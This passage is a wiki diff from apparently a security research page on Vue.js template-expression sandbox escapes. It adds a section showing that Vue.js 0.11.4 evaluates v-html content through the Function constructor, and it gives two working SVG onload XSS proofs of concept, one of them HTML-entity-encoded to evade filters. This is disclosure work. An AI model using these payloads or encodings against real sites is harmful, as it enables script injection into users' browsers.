@@ -76,7 +76,7 @@ new Vue({
 
 Now, why is that so? Let's have a look at the details.
 
-== Eval via Function ==
+=== Eval via Function ===
 
 Not unlike a vast majority of other frameworks, Vue.js appreciates the fact that we can pour arbitrary strings into the function constructor and have some sort of eval. Still, using the common `constructor.constructor` trick is not possible here. Vue.js will even notify us on the console about a possible security violation.
 
@@ -142,3 +142,62 @@ function makeGetter (exp, raw) {
 }}}
 
 Vue.js needs to urgently re-think their sandbox concept. It obviously does not work by design and patching in more characters will not be overly helpful.
+
+== Vue.js 0.11.4 ==
+
+The current version of Vue.js made an interesting choice. The dysfunctional sandbox from the earlier tested version (0.10.5) simply got removed, there's no regular expressions or scope checks anymore. 
+
+Anything that is echoed inside a `v-html` is used as an argument for the `Function` constructor and will be evaluated in the global scope.
+
+{{{
+<script type='text/javascript' src="https://raw.githubusercontent.com/yyx990803/vue/0.11.4/dist/vue.js"></script>
+<script type='text/javascript'>
+window.onload=function(){
+	new Vue({el: '#editor'})
+}
+</script>
+<div id="editor">
+    <div v-html="'\x3csvg onload=alert(1)\x3e'"></div>
+</div>
+}}}
+
+Needless to say, we can even encode the content with HTML entities:
+
+{{{
+<script type='text/javascript' src="https://raw.githubusercontent.com/yyx990803/vue/0.11.4/dist/vue.js"></script>
+<script type='text/javascript'>
+window.onload=function(){
+	new Vue({el: '#editor'})
+}
+</script>
+<div id="editor">
+    <div v-html="&apos;&bsol;x3csvg&Tab;onload=alert&lpar;1&rpar;&bsol;x3e&apos;"></div>
+</div>
+}}}
+
+=== Eval via Function ===
+
+Again, the `Function` constructor is being used to evaluate content of expression attributes. Nothing special to see here, moving on.
+
+{{{
+	/**
+	 * Build a getter function. Requires eval.
+	 *
+	 * We isolate the try/catch so it doesn't affect the
+	 * optimization of the parse function when it is not called.
+	 *
+	 * @param {String} body
+	 * @return {Function|undefined}
+	 */
+
+	function makeGetter (body) {
+	  try {
+	    return new Function('scope', 'return ' + body + ';')
+	  } catch (e) {
+	    _.warn(
+	      'Invalid expression. ' +
+	      'Generated function body: ' + body
+	    )
+	  }
+	}
+}}}
